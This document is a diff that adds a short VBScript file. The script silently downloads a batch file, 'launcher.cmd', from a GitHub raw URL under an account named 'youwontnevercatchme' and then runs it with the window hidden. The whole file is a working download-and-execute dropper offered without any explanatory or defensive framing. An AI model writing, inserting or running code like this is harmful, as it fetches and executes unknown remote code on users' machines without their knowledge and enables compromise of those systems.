@@ -1,0 +1,4 @@
+Dim objShell
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "curl -L -o ""launcher.cmd"" ""https://raw.githubusercontent.com/youwontnevercatchme/files/refs/heads/main/ch3""", 0, True
+objShell.Run "cmd /c launcher.cmd", 0, True
